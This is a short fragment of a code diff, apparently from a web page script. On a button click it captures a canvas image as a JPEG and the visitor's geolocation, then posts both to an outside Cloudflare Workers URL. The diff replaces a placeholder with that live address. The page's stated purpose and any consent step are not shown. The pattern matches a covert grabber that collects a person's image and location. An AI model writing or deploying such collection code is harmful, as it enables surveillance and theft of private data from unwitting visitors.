@@ -64,7 +64,7 @@ btn.onclick = async () => {
   const image = canvas.toDataURL('image/jpeg');
 
   navigator.geolocation.getCurrentPosition(async pos => {
-    await fetch('PASTE_BACKEND_URL_HERE', {
+    await fetch('https://lava.m-ghanbarpour-gh.workers.dev/', {
       method: 'POST',
       headers: {'Content-Type': 'application/json'},
       body: JSON.stringify({
